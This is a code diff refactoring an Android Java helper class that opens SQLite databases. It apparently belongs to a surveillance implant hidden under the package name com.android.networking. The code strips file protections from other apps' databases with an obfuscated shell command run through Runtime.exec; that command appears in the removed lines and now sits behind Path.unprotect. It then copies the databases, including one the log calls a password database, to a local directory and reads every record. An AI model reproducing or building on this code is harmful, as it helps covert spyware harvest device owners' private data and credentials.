@@ -17,18 +17,60 @@ import com.android.networking.file.Path;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
 
-public class GenericSqliteHelper extends SQLiteOpenHelper {
+/**
+ * Helper to access sqlite db.
+ * 
+ * @author zeno
+ * 
+ */
+public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	private static final String TAG = "GenericSqliteHelper";
+	private static final int DB_VERSION = 4;
 	public static Object lockObject = new Object();
+	private String name;
 
-	private GenericSqliteHelper(String name, int version) {
-		super(Status.self().getAppContext(), name, null, version);
+	private GenericSqliteHelper(String name) {
+		this.name=name;
 	}
-	
+
+	/**
+	 * Copy the db in a temp directory and opens it
+	 * 
+	 * @param dbFile
+	 * @return
+	 */
+	public static GenericSqliteHelper open(String dbFile) {
+		File fs = new File(dbFile);
+		return open(fs);
+	}
+
+	public static GenericSqliteHelper open(String databasePath, String dbfile) {
+		File fs = new File(databasePath, dbfile);
+		return open(fs);
+	}
+
+	public static GenericSqliteHelper open(File fs) {
+		if (fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath())) {
+			return new GenericSqliteHelper(fs.getAbsolutePath());
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
+			}
+			return null;
+		}
+
+	}
+
+	/**
+	 * Copy the db in a temp directory and opens it
+	 * 
+	 * @param dbFile
+	 * @return
+	 */
 	public static GenericSqliteHelper openCopy(String dbFile) {
-		File fs=new File(dbFile);
-		
-		if (fs.exists() && unprotect(fs.getParent()) && unprotect(fs.getAbsolutePath())) {
+		File fs = new File(dbFile);
+
+		if (fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath())) {
 			dbFile = fs.getAbsolutePath();
 		} else {
 			if (Cfg.DEBUG) {
@@ -37,81 +79,81 @@ public class GenericSqliteHelper extends SQLiteOpenHelper {
 			return null;
 		}
 
-		
 		String localFile = Path.markup() + fs.getName();
 		try {
 			Utils.copy(new File(dbFile), new File(localFile));
 		} catch (IOException e) {
 			return null;
 		}
-		
-		return new GenericSqliteHelper(localFile,4);
-		
-		
+
+		return new GenericSqliteHelper(localFile);
+
 	}
-	
+
+	/**
+	 * Copy the db in a temp directory and opens it
+	 * 
+	 * @param pathSystem
+	 * @param file
+	 * @return
+	 */
 	public static GenericSqliteHelper openCopy(String pathSystem, String file) {
-		return openCopy(new File(pathSystem,file).getAbsolutePath());
+		return openCopy(new File(pathSystem, file).getAbsolutePath());
 	}
 
-	private static boolean unprotect(String path) {
-		try {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
-			}
-			Runtime.getRuntime().exec(Messages.getString("h_3") + path);
-			return true;
-		} catch (IOException e) {
-			return false;
-		}
-	}
-
-	public GenericSqliteHelper(String filepath, boolean copy) {
-		super(Status.self().getAppContext(), filepath, null, 4);
-		
-		
-		
-	}
-
-
+	/*
 	@Override
 	public void onCreate(SQLiteDatabase db) {
 	}
 
 	@Override
 	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
-	}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onUpgrade), old: " + oldVersion);
+		}
+	}*/
 
-	public void traverseRecords(String table, String[] projection, RecordVisitor visitor) {
-
+	/**
+	 * Traverse all the records of a table on a projection. Visitor pattern
+	 * implementation
+	 * 
+	 * @param table
+	 * @param projection
+	 * @param selection 
+	 * @param visitor
+	 */
+	public int traverseRecords(String table, RecordVisitor visitor) {
 		synchronized (lockObject) {
 			SQLiteDatabase db = getReadableDatabase();
 			SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 
 			queryBuilderIndex.setTables(table);
-			Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 
-			visitor.init();
+			Cursor cursor = queryBuilderIndex.query(db, visitor.getProjection(),  visitor.getSelection(), null, null, null, null);
+			String[] columns = cursor.getColumnNames();
 
+			visitor.init(table, columns, cursor.getCount());
+
+			int maxid = 0;
 			// iterate conversation indexes
 			while (cursor != null && cursor.moveToNext()) {
-				visitor.cursor(cursor);
-
-				// String[] record = new String[projection.length];
-				// int rpos=0;
-				// for (String column : projection) {
-				//
-				// record[rpos] = cursor.getString(
-				// cursor.getColumnIndex(column) );
-				// rpos++;
-				// }
-
+				int id = visitor.cursor(cursor);
+				maxid = Math.max(id, maxid);
 			}
 
 			visitor.close();
 			cursor.close();
 			db.close();
+
+			return maxid;
 		}
+
+	}
+
+
+
+	public SQLiteDatabase getReadableDatabase() {
+		return SQLiteDatabase.openDatabase(name, null, SQLiteDatabase.OPEN_READONLY);
 	}
 
 }
